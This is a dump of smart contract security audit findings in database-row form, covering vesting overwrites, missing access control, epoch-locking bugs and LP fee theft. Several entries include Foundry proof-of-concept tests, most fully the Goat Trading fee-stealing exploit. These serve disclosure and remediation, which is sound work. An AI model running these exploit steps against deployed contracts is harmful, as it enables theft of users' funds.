possible to mitigate this issue by implementing zero check for _endTime variable. Listing 4: Possible Fix 1require (_endTime >_startTime ,""INVALID_TIME ""); Listing 5: Possible Fix-2 1require (_endTime != 0, ""INVALID_TIME_FOR_ENDTIME ""); 16FINDINGS & TECH DETAILS",Biconomy Vesting  Audit,Halborn,HIGH,,,15,4,5,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,solodit_reports,,2023-09-22 02:39:20,2024-10-14 22:01:25,1,,
1595285,6653e8fe1c6ea8d94e4b08b2c93df2c9,[H-01] Vesting schedule for a beneficiary can be overwritten,Pashov Audit Group,2023-06-01,"**Impact:**
High, as the amount left to be vested will be stuck in the contract forever

**Likelihood:**
Medium, as it requires more than 1 vesting schedule for the same beneficiary

**Description**

The vesting schedules in `Vesting` are saved in `schedules` mapping, which uses the `_beneficiary` address as the key. The problem is that if a beneficiary has a scheduled vesting already, if a second schedule is set to it, then the first one will be overwritten but the `schedulesTotalAmount` will still hold the first scheduled funds to vest. This means they will be stuck in the `Vesting` contract forever.

**Recommendations**

A possible solution is to use a vesting ID instead of the `beneficiary` address as the key in the `schedules` mapping or to disallow multiple schedules set for the same `beneficiary`.",Protectorate,Pashov,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-06-01-Protectorate.md,,,solodit_reports,,2024-03-11 21:09:56,2024-10-14 23:51:58,1,,
1625272,e847ed0f6b4423285939f4f13b61c9ff,[H-01] Sale creator can possibly steal bidders' claimable tokens,Pashov Audit Group,2023-05-01,"**Impact:**
High, as it results in a loss of funds for bidders

**Likelihood:**
Medium, as it requires to claim before cliff expires

**Description**

In `StakedVestedCrowdSale` the sale creator can give the address to his own `TokenVesting` & `TimelockedToken` contracts. Same in `VestedCrowdSale` but only for `TimelockedToken`. Now if the sale creator is malicious he can give the addresses of his own deployed contracts that inherit from either `TokenVesting` or `TimelockedToken` but add functionality to pull the funds out on demand, while they are still locked in them. This is even worse when it comes to the token locking logic in `VestedCrowdSale`, where on sale settlement the `TimelockedToken` contract is approved to spend all the `auctionToken` that should be claimed, meaning if it has the functionality it can just pull the funds and transfer them out of the contract on demand. This will result in inability for bidders to claim their tokens and 100% loss of their value.

**Recommendations**

Enforce both `TokenVesting` & `TimelockedToken` contracts to be only internally deployed from a predefined bytecode/implementation and do not accept user-supplied contracts.",Ipnft,Pashov,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-IPNFT.md,,,solodit_reports,,2024-03-11 21:09:22,2024-10-14 23:46:39,1,,
1625291,a16303c356fc506ce513f67e4a4aaff0,[H-01] Missing user input validation can lead to stuck funds,Pashov Audit Group,2023-07-01,"**Severity**

**Impact:**
High, as all mint fees can be stuck forever

**Likelihood:**
Medium, as users can easily misconfigure inputs

**Description**

There are multiple insufficiencies in the input validation of the arguments of the `initialize` method in `Nft`:

1. The sum of the `supply` of all `categories_` can be less than the `maxMintSupply_` - this would lead to the mint never completing, which results in all of the ETH in the `Nft` contract coming from mints so far being stuck in it forever
2. The `duration` of the `vestingParams_` should have a lower and upper bound as for example a too big of a duration can mean vesting can never complete or a division rounding error
3. The `mintEndTimestamp` of `refundParams_` should not be too further away in the future otherwise refund & vesting mechanisms would never work, and if it is too close then the mint mechanism won't work.

**Recommendations**

Add a validation that the sum of all categories' supply is more than or equal to the `maxMintSupply`. Also add sensible upper and lower bounds for both `duration` for the vesting mechanism and `mintEndTimestamp` for the refund mechanism.",Baton Launchpad,Pashov,HIGH,Missing Check,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-07-01-Baton Launchpad.md,,,solodit_reports,,2024-03-11 21:10:21,2024-10-14 23:57:39,1,,Launchpad
1715114,762ffcb6b4877039f5587f328e63bad0,H-1: Creating new withdrawal requests in conjunction with `settleEpochFromEigenLayer` will render system unusable,Sherlock,2024-03-07,"# Issue H-1: Creating new withdrawal requests in conjunction with `settleEpochFromEigenLayer` will render system unusable 

Source: https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/4 

## Found by 
0xkaden, AuditorPraise, Aymen0909, Bauer, ComposableSecurity, Drynooo, HSP, KupiaSec, Stiglitz, Thanos, Tricko, almurhasan, aslanbek, bhilare\_, cu5t0mPe0, deth, eeshenggoh, fnanni, g, giraffe, hash, iamandreiski, jovi, kennedy1030, klaus, lemonmon, lil.eth, monrel, mstpr-brainbot, mussucal, peanuts, popular, sakshamguruji, shaka, thec00n, zraxx, zzykxx
## Summary
This issue pertains to the flow where a user requests to withdraw more funds than are currently present in the `depositPool` and the system must withdraw from Eigenlayer. 

Users are able to create new withdrawal requests for the current epoch while the Eigenlayer withdrawal request is pending, as well as after the epoch has been marked `settled` in `settleEpochFromEigenLayer()`. This is due to the fact that `settleEpochFromEigenLayer()` does not increment the current epoch, as well as that there is no way to fulfill withdrawal requests submitted after the 7 day waiting period has been initiated. Submitting a withdrawal request will result in an inability to progress epochs and a locking of the system. 

## Vulnerability Detail
Consider the system in the following state:
- We are in epoch 0
- A user submitted a withdrawal request for an amount greater than what is currently in `depositPool`
- `rebalance() --> withdrawalQueue_.queueCurrentEpochSettlement()` has been called
- The system made a request to Eigenlayer for the necessary amount and the withdrawal request is ready to be claimed
- The next step is to call `RioLRTWithdrawalQueue:settleEpochFromEigenLayer()` [link](https://github.com/sherlock-audit/2024-02-rio-vesting-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTWithdrawalQueue.sol#L216)

The function `settleEpochFromEigenLayer()` performs several important tasks - completing pending withdrawals from Eigenlayer, accounting for the amounts received, burning the appropriate amount of LRTs, and marking the epoch as settled. It does NOT increment the epoch counter for the asset - the only way to do that is in `settleCurrentEpoch()`, which is only called in `rebalance()` when there is enough present in the `depositPool` to cover withdrawals. 

After calling `settleEpochFromEigenLayer()`, the system is in a state where the current epoch has been marked as settled. However, while waiting for the 7 day Eigenlayer delay it is possible that more users sent withdrawal requests. These withdrawal requests would be queued for epoch 0 (and increment `sharesOwed` for epoch 0) , but were not considered when performing the withdrawal from Eigenlayer. There is no way to process these requests, as the epoch has already been settled + we can only call `queueCurrentEpochSettlement` once per epoch due to the `if (epochWithdrawals.aggregateRoot != bytes32(0)) revert WITHDRAWALS_ALREADY_QUEUED_FOR_EPOCH();` check

Notably, users that requested withdrawals have already sent the LRT amount to be burned and are unable to reclaim their funds. 

Also note that there is no access control on `settleEpochFromEigenLayer()`, so as long as the provided withdrawal parameters are correct anybody can call the function. 

## Impact
Critical - system no longer operates, loss of users funds

## Code Snippet
The following test can be dropped into `RioLRTWithdrawalQueue.t.sol`
```solidity
 function test_lockAsset() public {
        uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));
        address operatorDelegator = reETH.operatorRegistry.getOperatorDetails(operatorId).delegator;

        // Deposit ETH, rebalance, and verify the validator withdrawal credentials.
        uint256 depositAmount = (ETH_DEPOSIT_SIZE - address(reETH.depositPool).balance);
        uint256 withdrawalAmount = 10 ether;
        assertGt(depositAmount, withdrawalAmount * 2); // We will be withdrawing twice
        reETH.coordinator.depositETH{value: depositAmount}();
        vm.prank(EOA, EOA);
        reETH.coordinator.rebalance(ETH_ADDRESS);
        uint40[] memory validatorIndices = verifyCredentialsForValidators(reETH.operatorRegistry, 1, 1);

        // Request a withdrawal and rebalance to kick off the Eigenlayer withdrawal process
        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, withdrawalAmount);
        skip(reETH.coordinator.rebalanceDelay());
        vm.prank(EOA, EOA);
        reETH.coordinator.rebalance(ETH_ADDRESS);

        // Ensure no reETH has been burned yet and process withdrawals.
        assertEq(reETH.token.totalSupply(), ETH_DEPOSIT_SIZE);
        verifyAndProcessWithdrawalsForValidatorIndexes(operatorDelegator, validatorIndices);

        // Settle the withdrawal epoch. This marks the epoch as settled and
        // makes the requested withdrawal amount available to be claimed.
        uint256 withdrawalEpoch = reETH.withdrawalQueue.getCurrentEpoch(ETH_ADDRESS);
        IDelegationManager.Withdrawal[] memory withdrawals = new IDelegationManager.Withdrawal[](1);
        withdrawals[0] = IDelegationManager.Withdrawal({
            staker: operatorDelegator,
            delegatedTo: address(1),
            withdrawer: address(reETH.withdrawalQueue),
            nonce: 0,
            startBlock: 1,
            strategies: BEACON_CHAIN_STRATEGY.toArray(),
            shares: withdrawalAmount.toArray()
        });
        reETH.withdrawalQueue.settleEpochFromEigenLayer(ETH_ADDRESS, withdrawalEpoch, withdrawals, new uint256[](1));

        IRioLRTWithdrawalQueue.EpochWithdrawalSummary memory epochSummary =
            reETH.withdrawalQueue.getEpochWithdrawalSummary(ETH_ADDRESS, withdrawalEpoch);
        // Epoch is settled
        assertTrue(epochSummary.settled);

        // However, the epoch has not been incremented - we're still in epoch 0 even after settlement
        assertEq(reETH.withdrawalQueue.getCurrentEpoch(ETH_ADDRESS), 0);

        // We can still create new withdrawal requests for this epoch and increase sharesOwed
        uint256 sharesOwedBefore = epochSummary.sharesOwed;
        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, withdrawalAmount);
        epochSummary = reETH.withdrawalQueue.getEpochWithdrawalSummary(ETH_ADDRESS, withdrawalEpoch);
        // Shares owed has increased
        assertGt(epochSummary.sharesOwed, sharesOwedBefore);

        // We've received one withdrawalAmount worth of assets from Eigenlayer
        assertEq(epochSummary.assetsReceived, withdrawalAmount);
        assertEq(epochSummary.shareValueOfAssetsReceived, withdrawalAmount);

        // Claim what was received from Eigenlayer (== one withdrawalAmount)
        uint256 balanceBefore = address(this).balance;
        uint256 amountOut = reETH.withdrawalQueue.claimWithdrawalsForEpoch(
            IRioLRTWithdrawalQueue.ClaimRequest({asset: ETH_ADDRESS, epoch: withdrawalEpoch})
        );
        IRioLRTWithdrawalQueue.UserWithdrawalSummary memory userSummary =
            reETH.withdrawalQueue.getUserWithdrawalSummary(ETH_ADDRESS, withdrawalEpoch, address(this));

        // The user has been marked as Claimed for this epoch, even though only one withdrawalAmount worth was claimed
        assertTrue(userSummary.claimed);
        assertEq(amountOut, withdrawalAmount);
        assertEq(address(this).balance - balanceBefore, withdrawalAmount);
        // sharesOwed for this epoch is 2 withdrawals worth (we're sitll missing one)
        assertEq(epochSummary.sharesOwed, withdrawalAmount * 2);

        // We can't rebalance because withdrawals have already been queued for this epoch
        // If we can't rebalance, we can't ever get to settleCurrentEpoch() to progress to the next epoch
        skip(reETH.coordinator.rebalanceDelay());
        vm.prank(EOA, EOA);
        vm.expectRevert(0x9a641da5); // WITHDRAWALS_ALREADY_QUEUED_FOR_EPOCH
        reETH.coordinator.rebalance(ETH_ADDRESS);

        // Current epoch is still 0
        assertEq(reETH.withdrawalQueue.getCurrentEpoch(ETH_ADDRESS), 0);

        // Reverts in pre-checks because the epoch has been marked as settled
        vm.expectRevert(0xad29946a); // EPOCH_ALREADY_SETTLED
        reETH.withdrawalQueue.settleEpochFromEigenLayer(ETH_ADDRESS, withdrawalEpoch, withdrawals, new uint256[](1));
    }
```
## Tool used

Manual Review

## Recommendation
Consider incrementing the current epoch as soon as the withdrawal process has been initiated, such that user withdrawal requests sent after an epoch has been queued for settlement will be considered a part of the next epoch



## Discussion

**solimander**

Valid bug - `currentEpochsByAsset[asset] += 1;` should be called in `queueCurrentEpochSettlement`.

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/rio-org/rio-sherlock-audit/pull/1.",Rio Network,Aymen0909|peanuts|zzykxx|lemonmon|sakshamguruji|thec00n|Tricko|Bauer|monrel|shaka|mstpr-brainbot|lil.eth|Stiglitz|mussucal|0xkaden|KupiaSec|klaus|deth|jovi|AuditorPraise|cu5t0mPe0|zraxx|aslanbek|hash|eeshenggoh|Drynooo|almurhasan|giraffe|fnanni|HSP|ComposableSecurity|bhilare\_|Thanos|kennedy1030|iamreiski|popular|g,HIGH,,62000 USDC,0,0,0,https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/4,,,https://app.sherlock.xyz/audits/contests/176,solodit_reports,,2024-04-15 21:12:14,2024-10-15 01:28:42,1,function settleEpochFromEigenLayer(,
1715255,11ae4334899ca9f3ce61bedde70ae2ce,[H-01] Development Team might receive less SALT because there is no access control on `VestingWallet#release()`,Code4rena,2024-01-16,"The Development Team could potentially incur a loss on their SALT distribution reward due to the absence of access control on `VestingWallet#release()`.

### Proof of Concept

When Salty exchange is actived, 10M SALT will be transferred to `teamVestingWallet` by calling [`InitialDistribution#distributionApproved()`](https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/InitialDistribution.sol#L50-L74):

```solidity
62: 	salt.safeTransfer( address(teamVestingWallet), 10 * MILLION_ETHER );
```

`teamVestingWallet` is responsible for distributing 10M SALT linely over 10 years ([Deployment.sol#L100](https://github.com/code-423n4/2024-01-salty/blob/main/src/dev/Deployment.sol#L100)):

```solidity
    teamVestingWallet = new VestingWallet( address(upkeep), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
```

From the above code we can see that the beneficiary of `teamVestingWallet` is `Upkeep`.

Each time [`Upkeep#performUpkeep()`](https://github.com/code-423n4/2024-01-salty/blob/main/src/Upkeep.sol#L244-L279) is called, `teamVestingWallet` will release a certain amount of SALT to `Upkeep`, the beneficiary, and then the relased SALT will be transferred to `mainWallet` of `managedTeamWallet`:

```solidity
  function step11() public onlySameContract
  {
    uint256 releaseableAmount = VestingWallet(payable(exchangeConfig.teamVestingWallet())).releasable(address(salt));
    
    // teamVestingWallet actually sends the vested SALT to this contract - which will then need to be sent to the active teamWallet
    VestingWallet(payable(exchangeConfig.teamVestingWallet())).release(address(salt));
    
    salt.safeTransfer( exchangeConfig.managedTeamWallet().mainWallet(), releaseableAmount );
  }
```

However, there is no access control on `teamVestingWallet.release()`. Any one can call `release()` to distribute SALT without informing `upkeep`. `upkeep` doesn't know how many SALT has been distributed in advance, it has no way to transfer it to the development team, and the distributed SALT by directly calling `teamVestingWallet.release()` will be locked in `upkeep` forever.

Copy below codes to [DAO.t.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/tests/DAO.t.sol) and run `COVERAGE=""yes"" NETWORK=""sep"" forge test -vv --rpc-url RPC_URL --match-test testTeamRewardIsLockedInUpkeep`

```solidity
  function testTeamRewardIsLockedInUpkeep() public {
    uint releasableAmount = teamVestingWallet.releasable(address(salt));
    uint upKeepBalance = salt.balanceOf(address(upkeep));
    uint mainWalletBalance = salt.balanceOf(address(managedTeamWallet.mainWallet()));
    //@audit-info a certain amount of SALT is releasable
    assertTrue(releasableAmount != 0);
    //@audit-info there is no SALT in upkeep
    assertEq(upKeepBalance, 0);
    //@audit-info there is no SALT in mainWallet
    assertEq(mainWalletBalance, 0);
    //@audit-info call release() before performUpkeep()
    teamVestingWallet.release(address(salt));
    upkeep.performUpkeep();
    
    upKeepBalance = salt.balanceOf(address(upkeep));
    mainWalletBalance = salt.balanceOf(address(managedTeamWallet.mainWallet()));
    //@audit-info all released SALT is locked in upKeep
    assertEq(upKeepBalance, releasableAmount);
    //@audit-info development team receive nothing
    assertEq(mainWalletBalance, 0);
  }
```

### Recommended Mitigation Steps

*   Since `exchangeConfig.managedTeamWallet` is immutable, it is reasonable to config `managedTeamWallet` as the beneficiary when [deploying `teamVestingWallet`](https://github.com/code-423n4/2024-01-salty/blob/main/src/dev/Deployment.sol#L100):

```diff
-   teamVestingWallet = new VestingWallet( address(upkeep), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
+   teamVestingWallet = new VestingWallet( address(managedTeamWallet), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
```

*   Introduce a new function in `managedTeamWallet` to transfer all SALT balance to `mainWallet`:

```solidity
  function release(address token) external {
    uint balance = IERC20(token).balanceOf(address(this));
    if (balance != 0) {
      IERC20(token).safeTransfer(mainWallet, balance);
    }
  }
```

*   Call `managedTeamWallet#release()` in `Upkeep#performUpkeep()`:

```diff
  function step11() public onlySameContract
  {
-   uint256 releaseableAmount = VestingWallet(payable(exchangeConfig.teamVestingWallet())).releasable(address(salt));
    
-   // teamVestingWallet actually sends the vested SALT to this contract - which will then need to be sent to the active teamWallet
    VestingWallet(payable(exchangeConfig.teamVestingWallet())).release(address(salt));
    
-   salt.safeTransfer( exchangeConfig.managedTeamWallet().mainWallet(), releaseableAmount );
+   exchangeConfig.managedTeamWallet().release(address(salt));
  }
```
**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/712#issuecomment-1945532417):**
 > The ManagedWallet now the recipient of teamVestingWalletRewards to prevent the issue of DOS of the team rewards.
> 
> https://github.com/othernet-global/salty-io/commit/534d04a40c9b5821ad4e196095df70c0021d15ab

 > ManagedWallet has been removed.
> 
> https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/712#issuecomment-1967449721):**
 > My initial view on this is that the issue is within `Upkeep` as it integrates poorly with the vesting wallet. It forgets that there is no access control, so I tend to see this as in scope.

 > The issue is not strictly in the deployment scripts, not strictly in the vesting wallet either because it makes sense to have no access control on `release`, so it must be in `Upkeep`.

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-salty-findings/issues/712)._

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/61), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/41), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/33).

***",Salty.IO,0xpiken,HIGH,,80000,0,0,0,https://github.com/code-423n4/2024-01-salty-findings/issues/712,https://code4rena.com/reports/2024-01-salty,,https://code4rena.com/reports/2024-01-salty,solodit_reports,327484da0e64097f328c340cfdc48251,2024-04-22 21:11:58,2024-10-15 01:04:52,1,"function distributionApproved() external
    	{
    	require( msg.sender == address(bootstrapBallot), ""InitialDistribution.distributionApproved can only be called from the BootstrapBallot contract"" );
		require( salt.balanceOf(address(this)) == 100 * MILLION_ETHER, ""SALT has already been sent from the contract"" );

    	// 52 million		Emissions
		salt.safeTransfer( address(emissions), 52 * MILLION_ETHER );

	    // 25 million		DAO Reserve Vesting Wallet
		salt.safeTransfer( address(daoVestingWallet), 25 * MILLION_ETHER );

	    // 10 million		Initial Development Team Vesting Wallet
		salt.safeTransfer( address(teamVestingWallet), 10 * MILLION_ETHER );

	    // 5 million		Airdrop Participants
		salt.safeTransfer( address(airdrop), 5 * MILLION_ETHER );
		airdrop.allowClaiming();

		bytes32[] memory poolIDs = poolsConfig.whitelistedPools();

	    // 5 million		Liquidity Bootstrapping
	    // 3 million		Staking Bootstrapping
		salt.safeTransfer( address(saltRewards), 8 * MILLION_ETHER );
		saltRewards.sendInitialSaltRewards(5 * MILLION_ETHER, poolIDs );
    	}
```
	VestingWallet public teamVestingWallet = VestingWallet(payable(exchangeConfig.teamVestingWallet()));
```
	function performUpkeep() public nonReentrant
		{
		// Perform the multiple steps of performUpkeep()
 		try this.step1() {}
		catch (bytes memory error) { emit UpkeepError(""Step 1"", error); }

 		try this.step2(msg.sender) {}
		catch (bytes memory error) { emit UpkeepError(""Step 2"", error); }

 		try this.step3() {}
		catch (bytes memory error) { emit UpkeepError(""Step 3"", error); }

 		try this.step4() {}
		catch (bytes memory error) { emit UpkeepError(""Step 4"", error); }

 		try this.step5() {}
		catch (bytes memory error) { emit UpkeepError(""Step 5"", error); }

 		try this.step6() {}
		catch (bytes memory error) { emit UpkeepError(""Step 6"", error); }

 		try this.step7() {}
		catch (bytes memory error) { emit UpkeepError(""Step 7"", error); }

 		try this.step8() {}
		catch (bytes memory error) { emit UpkeepError(""Step 8"", error); }

 		try this.step9() {}
		catch (bytes memory error) { emit UpkeepError(""Step 9"", error); }

 		try this.step10() {}
		catch (bytes memory error) { emit UpkeepError(""Step 10"", error); }

 		try this.step11() {}
		catch (bytes memory error) { emit UpkeepError(""Step 11"", error); }
		}",
1715335,b18818ca403e2a3bc671eb620541f3e1,H-1: Liquidity provider fees can be stolen from any pair,Sherlock,2024-03-31,"# Issue H-1: Liquidity provider fees can be stolen from any pair 

Source: https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/63 

## Found by 
AhmedAdam, C1rdan, zzykxx
## Summary
An attacker can steal the liquidiy providers fees by transfering liquidity tokens to the pair and then withdrawing fees on behalf of the pair itself.

## Vulnerability Detail

This is possible because of two reasons:
1. Transfering liquidity tokens to the pair itself [doesn't update the fee tracking variables](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L923-L925):

```solidity
if (to != address(this)) {
    _updateFeeRewards(to);
}
```
which results in the variable `feesPerTokenPaid[address(pair)]` of the pair being equal to 0.

2. The function [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) is a permissionless function that allows to withdraw fees on behalf of any address, including the pair itself.

By combining this two quirks of the codebase an attacker can steal all of the currently pending liquidity provider fees by doing the following:

1. Add liquidity to a pair, which will mint the attacker some liquidity tokens
2. Transfer the liquidity tokens to the pair directly
3. Call [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) by passing the address of the pair. Because `feesPerTokenPaid[address(pair)]` is 0 this will collect fees on behalf of the pair even if it shouldn't. The function will transfer an amount `x` of WETH from the pair to the pair itself and will lower the [_pendingLiquidityFee](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L622C13-L622C34) variable by that same amount 
4. Because the variable `_pendingLiquidityFee` has been lowered by `x` the pool will assume someone transferred `x` WETH to it
5. At this point the attacker can take advantage of this however he likes, but for the sake of the example let's suppose he calls [swap()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L242) to swap `x` ETH into tokens that will be transferred to his wallet
6. The attacker burns the liquidity transferred at point `2` to recover his funds

### POC

<details>
<summary>Show</summary>
To copy-paste in `GoatV1Pair.t.sol`:

```solidity
function testStealFees() public {
    GoatTypes.InitParams memory initParams;
    initParams.virtualEth = 10e18;
    initParams.initialEth = 10e18;
    initParams.initialTokenMatch = 10e18;
    initParams.bootstrapEth = 10e18;

    address pairAddress = factory.createPair(address(goat), initParams);
    address to = users.lp;

    //-> The following block of code:
    //  1. Creates a pool and immediately converts it into AMM
    //  2. Skips 31 days to skip the vesting period
    //  3. Simulates users using the pool by performing a bunch of swaps
    {
        //-> 1. A pair is created and immediately converted to an AMM
        (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = GoatLibrary.getTokenAmountsForPresaleAndAmm(
            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch
        );
        uint256 bootstrapTokenAmt = tokenAmtForPresale + tokenAmtForAmm;

        _fundMe(IERC20(address(goat)), to, bootstrapTokenAmt);
        _fundMe(IERC20(address(weth)), to, initParams.initialEth);
        vm.startPrank(to);

        goat.transfer(pairAddress, bootstrapTokenAmt);
        weth.transfer(pairAddress, initParams.initialEth);
        pair = GoatV1Pair(pairAddress);
        pair.mint(to);
        vm.stopPrank();

        //-> 2. Skips 31 days to skip the vesting period
        skip(31 days);
        
        //-> 3. Simulates users using the pool by performing a bunch of swaps
        uint256 reserveEth = 0;
        uint256 reserveToken = 0;
        _fundMe(IERC20(address(goat)), to, 100e18);
        _fundMe(IERC20(address(weth)), to, 100e18);
        for(uint256 i; i < 100; i++) {
            (reserveEth, reserveToken) = pair.getReserves();
            uint256 wethIn = 1e18;
            uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(wethIn, reserveEth, reserveToken);
            vm.startPrank(to);
            weth.transfer(address(pair), wethIn);
            pair.swap(goatOut, 0, to);
            vm.stopPrank();

            skip(3); //Avoid MEV restrictions

            (reserveEth, reserveToken) = pair.getReserves();
            uint256 goatIn = 1e18;
            uint256 wethOut = GoatLibrary.getWethAmountOutAmm(wethIn, reserveEth, reserveToken);
            vm.startPrank(to);
            goat.transfer(address(pair), goatIn);
            pair.swap(0, wethOut, to);
            vm.stopPrank();
        }
    }

    //-> The pool has some pending liquidity fees
    uint256 pendingLiquidityFeesBefore = pair.getPendingLiquidityFees();
    assertEq(pendingLiquidityFeesBefore, 809840958520307912);

    //-> The attacker adds liquidity to the pool 
    address attacker = makeAddr(""attacker"");
    (uint256 reserveEth, uint256 reserveToken) = pair.getReserves();
    uint256 initialGoatAmount = 5.54e18;
    uint256 initialWethAmount = GoatLibrary.quote(initialGoatAmount, reserveToken, reserveEth);
    _fundMe(IERC20(address(goat)), attacker, initialGoatAmount);
    _fundMe(IERC20(address(weth)), attacker, initialWethAmount);
    vm.startPrank(attacker);
    goat.transfer(pairAddress, initialGoatAmount);
    weth.transfer(pairAddress, initialWethAmount);
    pair.mint(address(attacker));
    vm.stopPrank();

    //-> Two days needs to be skipped to avoid locking time
    skip(2 days);

    //-> The attacker does the following:
    //  -> 1. Transfers the liquidity tokens to the pair
    //  -> 2. Calls `withdrawFees()` on behalf of the pair which will lower `getPendingLiquidityFees` variables and transfers WETH from the pool to the pool
    //  -> 3. Swaps the excess WETH in the pool to GOAT tokens
    //  -> 4. Burns the liquidity he previously transferred to the pair
    //  -> 5. The attacker profits and LP lose their fees
    {
        vm.startPrank(attacker);

        //-> 1. Transfers the liquidity tokens to the pair
        pair.transfer(address(pair), pair.balanceOf(attacker));

        //-> 2. Calls `withdrawFees()` on behalf of the pair
        pair.withdrawFees(address(pair));

        //-> An extra amount of WETH equal to the fees withdrawn on behalf of the pool is now in the pool 
        uint256 pendingLiquidityFeesAfter = pair.getPendingLiquidityFees();
        (uint256 reserveEthCurrent, uint256 reserveTokenCurrent) = pair.getReserves();
        uint256 extraWethInPool = weth.balanceOf(address(pair)) - reserveEthCurrent - pair.getPendingLiquidityFees() - pair.getPendingProtocolFees();
        assertEq(pendingLiquidityFeesBefore - pendingLiquidityFeesAfter, extraWethInPool);

        //-> 3. Swaps the excess WETH in the pool to GOAT tokens
        uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(extraWethInPool, reserveEthCurrent, reserveTokenCurrent);
        pair.swap(goatOut, 0, attacker);

        //-> 4. Burns the liquidity he previously transferred to the pair
        pair.burn(attacker);

        //-> 5. The attacker profits and LP lose their fees
        uint256 attackerWethProfit = weth.balanceOf(attacker) - initialWethAmount;
        uint256 attackerGoatProfit = goat.balanceOf(attacker) - initialGoatAmount;
        assertEq(attackerWethProfit, 399855575210658419);
        assertEq(attackerGoatProfit, 453187161321825804);

        vm.stopPrank();
    }
}

```
</details>

## Impact

Liquidity provider fees can be stolen from any pair.

## Code Snippet

## Tool used

Manual Review

## Recommendation

In [withdrawFees(pair)](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) add a require statement to prevent fees being withdrawn on behalf of the pool.
```solidity
require(to != address(this));
```



## Discussion

**adamidarrha**

This issue warrants a HIGH severity rating.
 It demonstrates how any liquidity provider can siphon fees intended for all other liquidity providers. This aligns with the Sherlock Docs criteria for a HIGH issue:
1. Definite loss of funds without (extensive) limitations of external conditions: 
- The exploit clearly results in the theft of LP fees, with the only requirement being that the attacker holds a portion of the total LP tokens. this doesn't result in any loss for the hacker, and he can do it for any new fees aquired.
3. Inflicts serious non-material losses (doesn't include contract simply not working):
- While the core functionality of the protocol may remain intact, the loss of fees represents a significant financial loss for LPs.

the POC in [ C1rdan - hacker can steal fee from LPs #25 ](https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/25) clearly demonstrates that any LP token holder can steal fees from all other LPs.  This constitutes a direct loss of funds and should be classified as a HIGH severity issue according to Sherlock guidelines.

**Proof Of Concept**
here a modified verssion C1rdan POC to show an attacker can steal all fees and not just a portion:

```solidity=
function _setupPair() internal returns(uint256 lpBalance) {

        GoatTypes.InitParams memory initParams;
        initParams.virtualEth = 10e18;
        initParams.initialEth = 10e18;
        initParams.initialTokenMatch = 1000e18;
        initParams.bootstrapEth = 10e18;
        uint256 wethAmount = 10e18;
        _mintInitialLiquidity(initParams, users.lp);

        uint256 fees = (wethAmount * 99) / 10000;
        uint256 totalLpFees = (fees * 40) / 100;
        uint256 totalSupply = pair.totalSupply();
        uint256 feesPerTokenStored = (totalLpFees * 1e18) / totalSupply;
        lpBalance = pair.balanceOf(users.lp);
        uint256 lpFees = (feesPerTokenStored * lpBalance) / 1e18;

        feesPerTokenStored = pair.feesPerTokenStored();
        uint256 earned = pair.earned(users.lp);
    }

    function _setUpAddress(address user) internal returns (uint wethStart, uint tokenStart) {
        (uint256 wethR, uint256 tokenR) = pair.getReserves();
        wethStart = wethR+ 1e18 ;
        tokenStart= tokenR+ 100e18 ;

        vm.deal(user,wethStart);
        _fundMe(IERC20(goat), user, tokenStart );
        vm.prank(user);
        weth.deposit{value: wethStart}();
    }

    function testStealFees() public {

        uint256 initialLPBalance = _setupPair();
 
        address hacker = address(0x1337);

        (uint wethStart, uint tokenStart) = _setUpAddress(hacker);

        // hacker adding Liquidity
        vm.startPrank(hacker);
        weth.transfer(address(pair), wethStart - 1e18);
        goat.transfer(address(pair), tokenStart - 100e18);
        pair.mint(hacker);
        vm.stopPrank();
